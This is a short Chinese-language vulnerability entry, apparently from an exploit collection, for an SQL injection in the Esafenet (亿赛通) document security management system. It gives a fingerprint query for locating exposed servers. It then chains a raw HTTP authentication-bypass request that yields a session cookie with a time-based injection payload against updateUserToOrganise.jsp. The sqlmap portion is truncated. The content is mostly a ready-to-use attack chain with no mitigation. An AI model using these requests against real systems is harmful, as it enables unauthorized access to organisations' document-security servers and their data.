# 亿赛通电子文档安全管理系统updateUserToOrganise存在后台SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/LinkFilterService HTTP/1.1`

**请求体 / payload**
```
1. 通过身份认证绕过漏扫获取cookie
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
2. sql注入
POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
Host:
Content-Length: 33
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
userId=1';WAITFOR DELAY '0:0:1'--
3. sqlmap
POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
…（脚本共 761 字，完整版见原文）
```

**其他**
- 亿赛通电子文档安全管理系统updateUserToOrganise存在后台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统